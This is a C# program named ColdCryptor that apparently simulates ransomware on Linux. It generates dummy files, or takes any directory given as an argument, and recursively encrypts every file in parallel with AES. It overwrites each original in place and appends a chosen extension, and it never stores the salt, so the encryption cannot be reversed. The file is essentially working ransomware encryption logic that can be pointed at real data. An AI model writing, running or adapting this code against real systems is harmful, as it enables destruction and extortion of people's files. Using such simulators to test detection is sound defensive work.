// this is essentially the same as coldencryptor.cs but without the Registry functionality
// this is meant to be used on a linux system
using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Collections.Generic;
using System.Threading.Tasks;

public class Crypto
{
    // store all of the generated crypto related code used for the EncryptFile function here
    public Crypto()
    {
        string password = "password";
        byte[] salt = new byte[32];
        RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider();
        for (int i = 0; i < 10; i++)
        {
            // Fill buffer.
            rng.GetBytes(salt);
        }
        byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
        RijndaelManaged AES = new RijndaelManaged();
        AES.KeySize = 256;
        AES.BlockSize = 128;
        AES.Padding = PaddingMode.PKCS7;
        Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
        AES.Key = key.GetBytes(AES.KeySize / 8);
        AES.IV = key.GetBytes(AES.BlockSize / 8);
        AES.Mode = CipherMode.CBC;
        this.AES = AES;
        this.salt = salt;
    }

    public RijndaelManaged AES { get; private set; }
    public byte[] salt { get; private set; }
}

public static class ColdCryptor
{
    // https://stackoverflow.com/a/1262619
    public static void Shuffle<T>(this IList<T> list)
    {
        Random rng = new Random();
        int n = list.Count;
        while (n > 1)
        {
            n--;
            int k = rng.Next(n + 1);
            T value = list[k];
            list[k] = list[n];
            list[n] = value;
        }
    }

    static void Main(string[] args)
    {
        Console.WriteLine("ColdCryptor");

        List<string> directories;
        bool createFiles = true;

        if (args.Length < 2)
        {
            Console.WriteLine("missing args");
            return;

        }
        else
        {
            // coldcryptor <command> <extension> [<directory>]
            if (args.Length == 3)
            {
                directories = new List<string> { args[2] };
                createFiles = false;
            }
            else
            {
                directories = new List<string> { "one", "two", "three" };  // directories to make
            }
        }

        Crypto crypto = new Crypto();
        string extension = args[1];
        string extension_key_name = "." + extension;

        if (String.Compare(args[0], "run") == 0)
        {
            Console.WriteLine("run");
            var files = new List<string>();

            if (createFiles)
            {
                bool writeData = false;
                string fileData = "";
                // if the file "data" exists, use it to populate generated files
                if (File.Exists("data"))
                {
                    writeData = true;
                    fileData = File.ReadAllText("data");
                }
                foreach (string directory in directories)
                {
                    Directory.CreateDirectory(directory);
                    foreach (int num in Enumerable.Range(1, 50))
                    {
                        string file = directory + "/" + num + ".txt";
                        using (StreamWriter sw = File.CreateText(file))
                        {
                            // file name (no extension) + directory written to generated files always
                            // data file written is file is detected
                            sw.WriteLine(directory);
                            sw.WriteLine(num);
                            if (writeData)
                            {
                                sw.WriteLine(fileData);
                            }
                        }
                        files.Add(file);
                    }
                }
            }
            else
            {
                files = Directory.EnumerateFiles(directories[0], "*", SearchOption.AllDirectories).ToList();
            }

            files.Shuffle();
            Parallel.ForEach(files, file => {
                EncryptFile(file, extension, crypto);
                Console.WriteLine(file);
            });

        }

        if (String.Compare(args[0], "clean") == 0)
        {
            Console.WriteLine("clean");
            foreach (string directory in directories)
            {
                Directory.Delete(directory, true);
            }

        }

        Console.WriteLine("Done");
        return;
    }

    public static void EncryptFile(string inputFile, string ext, Crypto crypto)
    {
        var AES = crypto.AES;
        var salt = crypto.salt;
 
        MemoryStream memTmp = new MemoryStream();
        using(FileStream fsIn = new FileStream(inputFile, FileMode.Open))
        {
            fsIn.CopyTo(memTmp);
        }

        memTmp.Seek(0, SeekOrigin.Begin);
        FileStream fsOut = new FileStream(inputFile, FileMode.Truncate);
        using (CryptoStream cs = new CryptoStream(memTmp, AES.CreateEncryptor(), CryptoStreamMode.Read))
        {
            cs.CopyTo(fsOut);
        }
        fsOut.Close();
        memTmp.Close();
        File.Move(inputFile, inputFile + "." + ext);
    }
}
